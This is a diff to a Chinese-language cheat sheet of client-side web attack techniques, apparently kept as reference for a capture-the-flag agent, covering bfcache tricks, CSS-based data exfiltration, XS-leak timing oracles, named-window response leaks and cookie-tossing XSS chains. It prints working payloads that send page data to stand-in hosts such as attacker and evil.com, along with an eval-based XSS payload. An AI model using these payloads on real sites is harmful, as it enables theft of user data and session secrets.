@@ -34,13 +34,14 @@
 ```
 
 **关键限制**：
-- Chrome 默认开 bfcache；2025/09 起连 `Cache-Control:no-store` 也开 bfcache
+- Chrome 默认开 bfcache；`Cache-Control:no-store` 页面自 Chrome 116 起分阶段放量、134/135（2025-03/04）全量放开（限 HTTPS 页面、仅 Chrome；cookie/授权状态变更等会 evict）；条件不满足或 HTTP 页面仍不进（回退重新发请求）
 - 用 `new WebSocket()` 主动禁掉 bfcache（连接存在时页面不进 bfcache）
 - 也可利用 bfcache 让 fetch 携带攻击者 header（如带 SCRIPT_NAME header 绕过校验）
 
 ## §3 CSS trigram exfil（通用数据外带框架）
 
 > CSP 封死 JS 时，用 CSS 属性选择器 + 资源加载做数据外带。
+> 纯 CSS 攻击完整体系（UI 劫持/键盘记录/净化器绕过/CSSOM mutation/nesting 压缩/CSP 全封外带）见 `$AGENT_DIR/knowledge-base/css-attacks.md`。
 
 ### 基本原理
 ```css
@@ -83,6 +84,21 @@
 <img class="i00" loading="lazy" src="//evil.com/leak?q=i00" style="display:none">
 ```
 
+### CSS-only oracle 补充两型
+
+**@font-face unicode-range 字符集泄露**: 每字符一个 @font-face、unicode-range 匹配单码点——浏览器只为实际存在的字符拉字体，服务端日志即字符集（无序无量；补序用 ::first-letter/text-indent/:nth-child）:
+```css
+@font-face { font-family: exfil; src: url('http://attacker/leak?c=a'); unicode-range: U+0061; }
+.target { font-family: exfil; }
+```
+跨域 CSS 必须带 Content-Type: text/css。
+
+**字形宽度 + container query 逐字符精确泄露**: 自定义字体每字符 advance width 唯一（width=(char_index+1)*1536 font units），容器 container-type:inline-size 后按宽度区间触发请求——纯 CSS 无 JS，严格 CSP 拦全部 script 仍可用:
+```css
+@container (min-width: 150px) and (max-width: 160px) { .probe { background: url('//attacker/?char=a&pos=0'); } }
+```
+选择器瞄准内联脚本内容: `script:not([src]):has(+script[src*='purify'])`。
+
 ## §4 xsleak oracle 列表
 
 > 无法 XSS 时，用侧信道判断 secret（"无 XSS 也能拿 flag"）。
@@ -99,6 +115,9 @@
 **扩展 timing 侧信道**:
 - **指数膨胀链**: Chrome 扩展 content-script 逐 phrase `replaceAll`。构造 phrase list 使命中后文档体积指数增长（O(2^n)），~20 条规则可膨胀到 ~10GB。优化: `[CENSORED]` 含两个 `E`，直接用 `"E"` 作 phrase 每轮翻倍，规则数减半。
 - **检测手法（跨域 iframe timing oracle）**: 把受害页放 iframe，用 `iframe.src = iframe.src`（设成相同值，**不是** `location.reload()`——跨域被禁）触发 reload，测第二次起的 load 事件延迟；reload 10 次取最慢，阈值 ~2000ms。第一次 load 在 content script 卡顿前触发，不计。
+- **jQuery :has() 嵌套选择器 timing**: `$(location.hash)` 类汇把 fragment 当 CSS 选择器时，`#*:has(*:has(*:has(*:has(*:has(body[data-user-id^='1'])))))` 嵌套使 Sizzle 求值仅匹配时膨胀到 ~2s——对 bot DOM 任意属性的布尔 oracle；前后两个 new Image().src 测 delta（20ms=不匹配/2s=匹配）。`$()` 以 `<` 开头当 HTML（XSS 面）、其余当选择器（oracle 面）——一个汇两种武器。
+- **PBKDF2 前缀短路 timing**: 服务端 `secret.startsWith(candidate)` + 昂贵 KDF（300 万迭代）→ 不匹配快返、匹配跑全量 KDF。popup.location 逐字符导航 + postMessage/load 计时，最高延迟字符=正确前缀。任何 PBKDF2/bcrypt/Argon2+短路前缀检查都中招。
+- **图片加载 timing + GraphQL GET**: GraphQL 端点接受 GET 时 `new Image().src=graphqlUrl?query=...` 是简单请求免 CORS 预检，onerror 在服务端响应后触发——SLEEP(1) 注入则 >1000ms，形成跨源布尔 oracle（bot 可达 localhost 时把 localhost-only 注入变远程可利用）。CSP 拦 inline script 时用 `<meta http-equiv=refresh>` 跳攻击者页再执行。隧道用 cloudflared（无插页）。
 
 ## §5 iframe reparenting / sandbox / CSP 继承
 
@@ -119,12 +138,43 @@
 
 ## §6 其他客户端原语速查
 
+### 命名窗口泄漏（绕 CSP `default-src 'none'` 的同源响应外带）
+
+**场景**: 脚本已在目标源执行（XSS/sandbox payload），需要读同源敏感端点（`/api/flag` 类）但 CSP `default-src 'none'`（或仅缺 `connect-src` 白名单）拦 `fetch`/XHR。**CSP 不治理表单导航与命名窗口**——`form-action` 指令未设置即畅通。
+
+**利用**（form target + 命名窗口取回）:
+```javascript
+// 1. GET 表单提交到敏感端点，target 指定命名辅助窗口
+const f = document.createElement('form');
+f.target = 'flagwin'; f.method = 'GET'; f.action = '/api/flag';
+document.body.appendChild(f); f.submit();          // 命名窗口渲染同源 JSON 响应
+// 2. 等待渲染后取回已存在的命名窗口读 body
+setTimeout(() => {
+  const w = open('', 'flagwin');                    // 命中已有窗口（非新建）
+  const data = w.document.body.innerText;           // 读响应
+  location = 'https://attacker/leak?d=' + encodeURIComponent(data); // 顶层导航外带
+}, 500);
+```
+
+**判据**: `open('', name)` 返回窗口且 `w.document` 可访问（Chrome 146-153 一致，探针 `$AGENT_DIR/scripts/probe-named-window-leak/` 可复验，判据见目录内 README）。失败排查: sandbox 属性/CSP `sandbox` 指令无 `allow-popups`/`allow-forms` 时整个通道被拦（先确认运行环境不是 iframe sandbox）; 窗口未渲染完就读（加大延时）。
+
+**防御视角**: 封死此通道需显式 `form-action` + 辅助窗口管控（`sandbox` 无 allow-popups），仅设 `default-src 'none'` 无效。
+
 ### connection pool + 递归 @import（无需自有服务器）
 Chrome 每域约 6（H1）/255（H2）连接上限。占满连接池 → 暂停/恢复目标页 CSS 请求 → 递归 `@import` 逐字符 leak。
 **核心价值**: 传统递归 @import 需自有服务器 stall 下一个 CSS；此法在另一个 tab 用 255 个 H2 连接占满连接池，即可控制目标域 CSS 加载时机——**`style-src 'self'`（无法外连）时仍能递归 leak**。需准备 buffer CSS（只 @import 另一个的空 CSS）缓冲初始并发请求。
 
 ### cookie tossing
 在目标域的可控子域写 cookie → 父域读取。`public suffix`（如 `*.usercontent.goog`）内无法直接 toss → 构造 HTTP 子域 `http://sbx-fake.sbx-real.host/`。
+
+**同名 Domain cookie shadowing 全链**（cookie 名无 `__Host-` 前缀 + 服务端把 cookie 值渲染进响应时）:
+1. **准备**: 敏感 cookie 为 host-only（bot 用 `url` 不带 `domain` 设置）且 HttpOnly——同站任意 sibling 子域（`*.chal.example` 下另一可控应用/另一实例）可写 `FLAG=<payload>; Domain=chal.example; Path=/admin` 与 `Path=/` 两条
+2. **Cookie 头构造**: 浏览器按"更长 Path 先发、同 Path 旧 cookie 先发"排序（RFC 6265 §5.4）→ `/admin` 请求头携带 `攻击值(Path=/admin) ; 真值(host-only) ; 攻击值(Path=/)`——同名三次
+3. **服务端解析差异定胜负**: 重复名的取值依栈而异——**Crystal（HTTP::Cookies 为 Hash）取最后一个**（攻击值胜）、**PHP `$_COOKIE` 取第一个**（先见者胜，攻击值放 Path 最长处）、Node `cookie` 包多为最后一个。写利用前必须对目标栈实际验证同名行为
+4. **sink 触发**: 服务端把该 cookie 值未经输出编码渲染进 HTML（对照同模板其他变量的 escape 调用差异）→ 攻击值成为存储型 XSS（`<svg/onload=eval(atob(location.hash.slice(1)))>` 类）
+5. **真值回收**: onload 处理器先 `document.cookie` 删除两条 tossing cookie（写过期 `Domain=chal.example`），再 `fetch('/admin')`——剩余 host-only HttpOnly 真值仍在请求头中，且被渲染进第二次响应 → 读 body 提取（**HttpOnly 只拦 JS 直接读 cookie，不拦"同源 refetch + 读渲染响应"**）
+
+**防御识别**: `__Host-` 前缀（强制 Secure/无 Domain/Path=/）使 tossing 失效; 服务端不依赖重复 cookie 顺序; cookie 值输出编码。
 
 ### 解析器差异 checklist
 | 差异 | 利用 |
@@ -167,11 +217,20 @@ onerror=eval; throw '=alert\x281\x29'
 throw onerror=eval,1
 ```
 
+### 杂项原语速查
+- **.replace() 特殊模式注入**: 替换串中 $` =匹配前内容、$' =匹配后——payload `abc$\`<img src=x onerror=...>` 经 $` 展开拼出完整标签。
+- **JSFuck 解码**: `eval(code.slice(0,-2))` 去掉执行尾取 Function 对象，`.toString()` 看原始代码；编码侧 () 也被过滤时用括号记号 `[![]+[]][+[]][+!![]]`（="false"[1]）替代调用。
+- **WebRTC ICE 内网 IP 泄露**: RTCPeerConnection+STUN 的 onicecandidate 无需交互/权限泄 192.168/10.x 内网地址——XSS 后映射内网供 SSRF 定向。
+- **终端退格符隐写**: 响应用 \x08 隐藏内容（后字符覆盖前字符），socket 收原始字节 replace(b'\x08',b'') 提取——终端显示≠传输字节。
+- **隐藏 DOM/付费墙**: 内容在 HTML 仅被遮罩（position:fixed/blur）——先 curl 原始响应 grep；隐藏元素用 getComputedStyle 批量提取 display:none/visibility:hidden/opacity:0。
+- **admin bot 攻击面**: ① `new URL()` 只验语法——javascript:/data: URL 在导航上下文执行（页面 CSP 无效），必须 allowlist 协议；② bot 有本地访问时 XHR file:// 同步读文件；③ report 端点 PoW 用 sha256 前缀爆破；④ 多 session ID 轮换试配置差异。
+- **React 自动化**: 受控输入用原生 setter+dispatchEvent（`Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set.call(input,v)` + input/change 事件）——React/Vue/Angular 通用；XSS 后经 `__reactInternalInstance$`/`__reactFiber$`（17+）走 `.return.stateNode.state`/`.memoizedState` 读未序列化进 HTML 的组件 state（token/私聊）。
+
 ## §7 工具链
 
 | 工具 | 用途 |
 |------|------|
-| Burp Suite + Turbo Intruder | 单包攻击（见 `race-conditions.md`）、DOM Invader（自动找 DOM XSS/PP 源/sink） |
+| python httpx(h2)/asyncio | 单包攻击（见 `race-conditions.md`）; DOM 源/sink 用 JS 静态 grep |
 | Playwright | admin bot 交互、批量二分 leak、timing oracle |
 | 自建 express/fastify | CSS leak server、bfcache/reparenting 复现台 |
 | 多版本 Chrome | 旧版 Chrome 行为差异是 exploit 前置条件 |
@@ -181,4 +240,7 @@ throw onerror=eval,1
 - `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` — 服务端漏洞模式
 - `$AGENT_DIR/knowledge-base/race-conditions.md` — 单包攻击 + 原型链污染
 - `$AGENT_DIR/knowledge-base/csp-bypass.md` — CSP 绕过专题
-- `$AGENT_DIR/knowledge-base/browser-debugging.md` — 浏览器调试方法
+- `$AGENT_DIR/knowledge-base/browser-automation.md` — 浏览器自动化 — 启动 / 登录 / 接管 / 确认
+
+- **Puppeteer JS 开关旁路**: page.setJavaScriptEnabled(false) 只影响当前上下文——iframe 内 window.open() 开的新窗口 JS 恢复启用。
+- **Link 头 Referer 泄露**: 响应头 `Link: <https://exfil.com/x>; rel="preload"; as="image"; referrerpolicy="unsafe-url"` 使 Chrome 以完整 URL 作 Referer 拉资源——token 在 /auth/callback?token= 时泄露。
